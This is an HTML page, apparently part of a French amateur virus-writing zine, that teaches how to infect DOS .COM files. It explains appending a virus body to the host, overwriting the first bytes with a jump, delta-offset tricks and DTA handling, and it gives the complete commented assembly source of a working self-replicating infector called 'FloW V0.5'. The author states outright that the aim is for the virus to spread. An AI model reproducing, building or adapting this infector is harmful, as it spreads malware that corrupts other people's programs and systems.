@@ -1,0 +1,522 @@
+<html>
+<head>
+<title>Infection dans les regles</title>
+</head>
+
+<body background="stars.jpg" bgcolor=black link=#006699 alink=#006699 vlink=#006699>
+<center>
+<img src="logo.jpg" >
+
+<br><br>
+<a href="virus2.html"><img alt="TiP-TaPettE"  src="prev.gif" ></a>&nbsp;
+<a href="sommaire.html"><img alt="Sommaire"  src="toc.gif" ></a>&nbsp;
+<a href="virus4.html"><img alt="PeTa La BoMbA"  src="next.gif"></a> 
+
+
+<br><br></center>
+
+<center>
+<table border> 
+<td width=650>
+<br>
+<FONT FACE="tahoma,verdana" size=2 color=green>
+<h1 align=center><font size=5 color=gray FACE="tahoma,Verdana">Infection dans les regles</font></h1><br>
+<b>
+<font size=2 color=#006699>
+La Theorie:<br>
+*********<br>
+</font><br>
+Bon le virus cree juste avant , il est cool mais bon y pourra jamais se repandre
+et le but d'un virus c'est quand meme de se repandre.<br>
+Il va falloir y remedier. Le principe est simple. Tout ce tut est sur les infections
+de fichiers com.<br>
+Lors du lancement d'un fichier infecte il ne faut pas qu'il n'y ait que le virus
+qui se mette en route. Il faut faire en sorte que le fichier infecte soit encore
+operationnel. Un prog infecte aura cette gueule :<br><br>
+
+<pre><font size=2 face=tahoma color=green>
+fichier avant :                             virus</font>
+<font size=2 color=#ff0000>
+
+|--------------------------------|         |-------------| 
+| P1 |           P2              |         |  V1  |  V2  |
+|--------------------------------|         |-------------|
+
+</font><font size=2 face=tahoma color=green>
+fichier a differents stade d'infection :</font>
+<font size=2 color=#ff0000>
+<font size=2 color=#ffff00>
+étape 1:</font>
+|---------------------------------------|
+|  P1  |         P2              |  P1  |
+|---------------------------------------|
+<font size=2 color=#ffff00>
+étape 2:</font>
+|---------------------------------------|
+|  V1  |         P2              |  P1  |
+|---------------------------------------|
+<font size=2 color=#ffff00>
+étape 3:</font>
+|----------------------------------------------|
+|  V1  |         P2              |  P1  |  V2  |
+|----------------------------------------------|
+
+</font></pre>
+La partie V1 envoie a la fin du fichier sur le virus proprement dit (V2) . Cependant pour
+realiser ce saut on est oblige de scalper quelques octets qui devront donc etre
+copies juste apres le virus.<br><br>
+Vous voyez en theorie c'est simple mais bon en pratique c'est une autre histoire.<br>
+<br>
+<font size=2 color=#006699>
+Mise En Pratique:<br>
+**************<br><br>
+</font>
+Lol ! d'abord lisez les tuts de Dark-Angel , vous les
+trouverez sur www.madchat.org .<br>
+D'ailleurs vous verrez que j'ai pompé sur lui les petits schemas en haut expliquant
+l'infection<br> 
+La ca se complique, car on peut pas faire comme l'autre virus en recopiant tout le contenu
+du prog dans le fichier cible. Beh oui si vous avez compris le schema d'en haut ca doit
+vous paraitre assez clair.<br>
+En exclusivite je vous propose donc le code commente du debut de FloW ecrit par moi meme<br>
+Les variable utilises dans le proggy :<br>
+<br>
+<font size=3 color=#ff0000><pre>   buffer db 3 dup (0)       ;buffer des 3 bits
+   fichiercom db '*.COM',0   ;cible: les coms
+   buffer2 db 0e9h,0,0       ;buffer du jmp de depart
+   verification db 0         ;sert pour tester si le fichier est deja infecte
+   mydta db 42 dup (?)
+
+</pre></font>
+(A placer a la fin du virus car c'est un .com)<br><br><br>
+<font size=2 color=#ffff00>
+etape 1:</font><br>
+<br>
+Tout d'abord on lit les 3 premiers bits du fichier (handle du fichier ouvert en bx):
+<font size=3 color=#ff0000>
+<pre>
+-----------------------------------------------------------------------------------
+
+   mov ax, 4200h             ;pointeur du fichier au debut
+   xor cx, cx                ;
+   xor dx, dx                ;
+   int 21h                   ;
+
+
+   mov ah,3fh                ;lecture des premiers bits
+   mov cx,3                  ;on en lit 3
+   lea dx,[bp+buffer]        ;les 3 bits dans buffer
+   int 21h                   ;
+
+
+-----------------------------------------------------------------------------------
+</pre></font>
+Il n'y a pas besoin de les recopier dans le fichier car quand on va dumper le virus
+pour le copier dans le fichier victime la valeur de buffer sera la nouvelle valeur
+dans ce fichier. (pas tres clair ca, arf...)<br><br>
+
+<font size=2 color=#ffff00>
+étape 2:</font><br>
+<br>
+On copie la premiere partie du virus (V1) au debut du fichier a infecter.<br>
+C'est a dire qu'on ecrit le jump vers la partie V2 du virus qui sera donc situe a 
+la fin du fichier.<br><br>
+Pour faire ca on a besoin de savoir la valeur du dernier offset du fichier. Cela
+se passe en deplacant le pointeur a la fin du fichier ax etant la valeur desiree .<br><br>
+
+<font size=3 color=#ff0000>
+<pre>
+-----------------------------------------------------------------------------------
+
+
+   mov ax, 4202h             ;pointeur du fichier a la fin
+   xor cx, cx                ;
+   xor dx, dx                ;
+   int 21h                   ;
+
+
+-----------------------------------------------------------------------------------
+</pre></font>
+puis on code le jmp souhaite :<br>
+<font size=3 color=#ff0000>
+<pre>
+-----------------------------------------------------------------------------------
+
+
+   sub ax,3
+   mov word ptr [bp+buffer2+1],ax     ;codage du jump
+
+
+-----------------------------------------------------------------------------------
+</pre></font>
+On soustrait 3 a la valeur du dernier offset car l'instruction codant un jmp nous prend
+ici 3 bits.<br><br>
+
+Et on passe a l'ecriture du jmp au debut du fichier :
+<font size=3 color=#ff0000>
+<pre>
+-----------------------------------------------------------------------------------
+
+
+   mov ax, 4200h             ;pointeur du fichier au debut
+   xor cx, cx                ;
+   xor dx, dx                ;
+   int 21h                   ;
+
+
+   mov ah, 40h               ;ecriture du jmp
+   mov cx, 3                 ;on écrit 3 bits
+   lea dx,[bp+buffer2]       ;pointe sur le jmp codé
+   int 21h                   ;
+
+
+-----------------------------------------------------------------------------------
+</pre></font>
+
+<font size=2 color=#ffff00>
+etape 3:</font><br>
+<br>
+Cette etape consiste juste a placer le pointeur en fin de fichier et a recopier la partie
+du virus que l'on desire. Voila comment on procede :<br>
+<font size=3 color=#ff0000>
+<pre>
+-----------------------------------------------------------------------------------
+
+
+   mov ax, 4202h             ;pointeur du fichier a la fin
+   xor cx, cx                ;
+   xor dx, dx                ;
+   int 21h                   ;
+
+
+   mov ah,40h                ;ecriture
+   mov cx, virus_end-virus   ;taille de notre virus
+   lea dx,[bp+virus]         ;pointe au debut du virus
+   int 21h
+
+-----------------------------------------------------------------------------------
+</pre></font>
+<br><br>
+Voila, on sait faire une infection en regle, mais maintenant il faudra le faire marcher
+et il reste quelque petite chose a expliquer.<br>
+Tout d'abord, vous avez pu remarquer avant chaque variable le [bp+...].<br>
+Vous vous demandez ce que c'est hein ! hehe. En fait c'est pas tres difficile a comprendre,
+quand on compile le code source les valeurs des offsets "buffer" ou "fichiercom" etc sont
+convertis en un nombre qui correspond au deplacement a realiser pour tomber sur les donnees.<br>
+<br>
+Le probleme c'est justement que quand notre virus va infecter rageusement sa victime eh beh
+ces valeurs ne seront plus valables. La solution consiste a trouver la position du debut
+du virus dans le fichier qu'on placera dans bp.<br><br>
+Et comment qu'on fait ? Eh beh il suffit d'un call. Je m'explique : un call pose sur la pile
+l'adresse de retour. Il suffit d'un pop pour lire cette valeur et ca roulez encore :<br>
+
+<font size=3 color=#ff0000>
+<pre>
+-----------------------------------------------------------------------------------
+
+
+virus:
+        call virus_start     ;call pour pouvoir recuperer l'adresse
+
+virus_start:
+
+   pop bp                    ;qu'on recupere       
+   sub bp,OFFSET virus_start ;et qu'on adapte a nos besoins
+
+
+-----------------------------------------------------------------------------------
+</pre></font>
+<br><br>
+Il faut aussi que notre virus verifie que le fichier a infecter ne l'est pas deja.
+La moi je fais un code a l'ancienne, je lis le premier bit pour voir si c'est un jmp
+et si ce n'est pas le cas j'infecte.<br>
+Si vous desirez un truc plus propre voir les cours de Dark-Angel.<br>
+<font size=3 color=#ff0000>
+<pre>
+-----------------------------------------------------------------------------------
+
+
+CHECK_INFECTION:             ;ça c'est du code barbare !
+
+   mov ah,3fh                ;lecture du 1er bit
+   mov cx,1                  ;on en lit 1
+   lea dx,[bp+verification]  ;le bit dans verification
+   int 21h                   ;
+
+
+   cmp [bp+verification], 0e9h   ;compare le 1er bit a 0e9h
+   jz FERMETURE             ;si = on cherche un autre
+
+
+-----------------------------------------------------------------------------------
+</pre></font>
+<br><br>
+Petit detail notre virus ne doit pas s'auto-infecter, alors pour cela on ecrit un jmp
+au debut qui saute de 0 ! octets, lol. On ecrit ca comme ca :
+
+<font size=3 color=#ff0000>
+<pre>
+-----------------------------------------------------------------------------------
+
+debut:
+
+   db 0e9h,0,0               ;on ecrie ça pour que le prog reconnaisse 
+                             ;qu'il est deja infecte
+                             ;car sinon il va s'auto-infecter
+
+
+-----------------------------------------------------------------------------------
+</pre></font>
+<br>
+Si ce truc vous le comprenez pas la fenetre est pas loin, sautez !<br><br>
+Seulement ca serait trop simple, il reste encore un detail de taille qui a fait que j'en
+ai chie pendant 2 semanines et que m'a "fucking with my head" sur #virus.<br>
+Je pensais pouvoir m'en passer et bien non !<br>
+Ce chieur se nomme DTA. Qu'est ce Que C'est :? (prenez l'accent du mec qui vient de ce prendre
+un rateau et qui se coince une couille dans la cuvette des chiottes qui s'est soudainement 
+rabattue,exemple : OuiNn Ques Que C'ééééééééééééé aaaaaiiiiieeeeeeeeeeeeeearggggg!!!!splash )<br>
+<br>
+Et oui comme on peut le voir la couille a explosee ! Eh sorry j'ai un peu derive.<br>
+<br>
+Bon la DTA c'est : Disk Transfert Area.<br><br>
+Hehe c'est plus clair, non ? En fait ca sert a avoir des renseignements sur les fichiers et on
+est oblige de l'utiliser car si des parametres sont passes au .com eh bien y va merdouiller
+(croyez moi, j'ai teste) si on l'utilise poa.<br>
+Pour s'en servir on cree d'abord une autre DTA comme ceci :
+
+<font size=3 color=#ff0000>
+<pre>
+-----------------------------------------------------------------------------------
+
+
+   lea  dx,[bp+mydta]        ;adresse de mydta
+   mov  ah,1ah               ;Set DTA
+   int  21h                  ;
+
+
+-----------------------------------------------------------------------------------
+</pre></font>
+puis en ouvrant le fichier a infecter on utilisera la DTA :<br>
+<font size=3 color=#ff0000>
+<pre>
+-----------------------------------------------------------------------------------
+
+
+   mov ax,3D02h              ;ouverture-du-fichier(le 02 indique lecture-ecriture)
+   lea  dx,[bp+mydta+1eh]    ;nom dans DTA_PLACE+1eh
+   int 21h
+
+-----------------------------------------------------------------------------------
+</pre></font>
+Puis en fin de programme on restaure la DTA originale :<br>
+
+<font size=3 color=#ff0000>
+<pre>
+-----------------------------------------------------------------------------------
+
+   mov  dx,80h               ;restauration de la dta
+   mov  ah,1ah               ;
+   int  21h                  ;
+
+-----------------------------------------------------------------------------------
+</pre></font>
+
+Hehe c'est cool, reste encore (et oui) un truc. Il faut ensuite passer la main au prog
+infecte et avant de proceder il faut resaturer en memoire les 3 premiers bits originaux.
+Voila le code :<br>
+
+<font size=3 color=#ff0000>
+<pre>
+-----------------------------------------------------------------------------------
+
+
+   mov cx,3                  ;remet les 3 bits originaux
+   mov di,100h               ;depart du com
+   lea si,[bp+buffer]        ;endroit où on a copié les 3 bits
+   rep movsb                 ;on le fait tant que cx!=0
+
+   mov di,100h               ;di pointe a 100h (depart des coms)
+   jmp di                    ;le virus passe la main au prog infecte
+
+
+-----------------------------------------------------------------------------------
+</pre></font>
+
+Hehe on a tout pour reussir, maintenant je vous donne le source en entier:<br><br>
+
+<font size=3 color=#ff0000>
+<pre>
+-----------------------------------------------------------------------------------
+
+
+CODE    SEGMENT                                                          
+        ASSUME CS:CODE,DS:CODE                                                    
+
+ORG 100H  
+
+debut:
+
+   db 0e9h,0,0               ;on ecrie ça pour que le prog reconnaisse 
+                             ;qu'il est deja infecte
+                             ;car sinon il va s'auto-infecter
+
+
+virus:
+        call virus_start     ;call pour pouvoir recuperer l'adresse
+
+virus_start:
+
+   pop bp                    ;qu'on recupere       
+   sub bp,OFFSET virus_start ;et qu'on adapte a nos besoins
+
+
+   mov cx,3                  ;remet les 3 bits originaux
+   mov di,100h               ;depart du com
+   lea si,[bp+buffer]        ;endroit où on a copié les 3 bits
+   rep movsb                 ;on le fait tant que cx!=0
+
+dta:
+
+   lea  dx,[bp+mydta]        ;adresse de mydta
+   mov  ah,1ah               ;Set DTA
+   int  21h                  ;
+
+   mov ah,4Eh                ;
+   lea dx,[bp+fichiercom]    ;findfirst
+   int 21h                   ;
+
+OUVERTURE:
+
+   jc fin                    ;si on trouve pas on quitte
+
+   mov ax,3D02h              ;ouverture-du-fichier(le 02 indique lecture-ecriture)
+   lea  dx,[bp+mydta+1eh]    ;nom dans DTA_PLACE+1eh
+   int 21h
+
+   mov bx,ax                 ;handle en bx
+
+
+CHECK_INFECTION:             ;ça c'est du code barbare !
+
+   mov ah,3fh                ;lecture du 1er bit
+   mov cx,1                  ;on en lit 1
+   lea dx,[bp+verification]  ;le bit dans verification
+   int 21h                   ;
+
+
+   cmp [bp+verification], 0e9h   ;compare le 1er bit a 0e9h
+   jz FERMETURE             ;si = on cherche un autre
+
+INFECTION:
+
+   mov ax, 4200h             ;pointeur du fichier au debut
+   xor cx, cx                ;
+   xor dx, dx                ;
+   int 21h                   ;
+
+
+   mov ah,3fh                ;lecture des premiers bits
+   mov cx,3                  ;on en lit 3
+   lea dx,[bp+buffer]        ;les 3 bits dans buffer
+   int 21h                   ;
+
+
+   mov ax, 4202h             ;pointeur du fichier a la fin
+   xor cx, cx                ;
+   xor dx, dx                ;
+   int 21h                   ;
+
+
+;codage du jmp
+   sub ax,3
+   mov word ptr [bp+buffer2+1],ax     ;codage du jump
+
+
+   mov ah,40h                ;ecriture
+   mov cx, virus_end-virus   ;taille de notre virus
+   lea dx,[bp+virus]         ;pointe au debut du virus
+   int 21h
+
+
+;ecriture du jmp
+
+   mov ax, 4200h             ;pointeur du fichier au debut
+   xor cx, cx                ;
+   xor dx, dx                ;
+   int 21h                   ;
+
+
+   mov ah, 40h               ;écriture du jmp
+   mov cx, 3                 ;on écrit 3 bits
+   lea dx,[bp+buffer2]       ;pointe sur le jmp code
+   int 21h                   ;
+
+
+FERMETURE:
+
+   mov ah,3Eh                ;fermeture-du-fichier
+   int 21h
+
+   mov ah,4Fh                ;findnext
+   int 21h                   ;si y en a pas on se casse
+   jmp OUVERTURE             ;si y en a on revient
+
+
+fin:
+
+;execution-du-prog-victime
+
+fin_cherche:
+   mov  dx,80h               ;replacement de la dta
+   mov  ah,1ah
+   int  21h
+
+   mov di,100h               ;di pointe a 100h (depart des coms)
+   jmp di                    ;le virus passe la main au prog infecte
+
+variables:
+
+   buffer db 3 dup (?)       ;buffer des 3 bits
+   fichiercom db '*.COM',0   ;cible: les coms
+   buffer2 db 0e9h,?,?       ;buffer du jmp de depart
+   verification db ?         ;sert pour tester si le fichier est deja infecte
+   TiPiaX db 'FloW V0.5 By PoSeiDoN (Fr)'
+
+virus_end:
+   mydta db 42 dup (?)       ;on le met la car on ne veut pas copier le contenu
+                             ;de la DTA
+
+CODE ENDS
+END debut
+
+-----------------------------------------------------------------------------------
+</pre></font>
+Un petit detail, il se peut que vous obteniez une erreur a l'execution du virus.
+C'est normal car lorsque que le prog de depart a fini son infection, il est entraine
+dans une boucle interminable (retour a 100h) et de mauvais bits sont places a 100h
+(les bits des progs infectes contenus dans buffer). Voyons le cote positif des choses,
+cela n'a aucune incidence sur la vie du virus et de plus cela permet d'arreter le prog
+viral de depart.<br><br>
+J'espere ne pas vous avoir trop embrouille. Je remercie Urgo32 de #virus pour m'avoir
+mis sur la voie de mon bug due a la DTA. ps: allez pas sur ce chan de barbare si vous
+y connaissez rien en virii ou en anglais, je me suis fais hacher dans tous les sens.
+(enfin c'est un bon moyen pour apprendre des insultes en anglais)
+
+
+
+</b>
+<br><br>
+<DIV ALIGN="right"><font size=+1 color="#006699">Tipiax</font></DIV><br>
+
+
+</font></table></center><br>
+
+<center>
+<a href="virus2.html"><img alt="TiP-TaPettE"  src="prev.gif" ></a>&nbsp;
+<a href="sommaire.html"><img alt="Sommaire"  src="toc.gif" ></a>&nbsp;
+<a href="virus4.html"><img alt="PeTa La BoMbA"  src="next.gif"></a>
+</center>
+
+</body>
+
+</html>
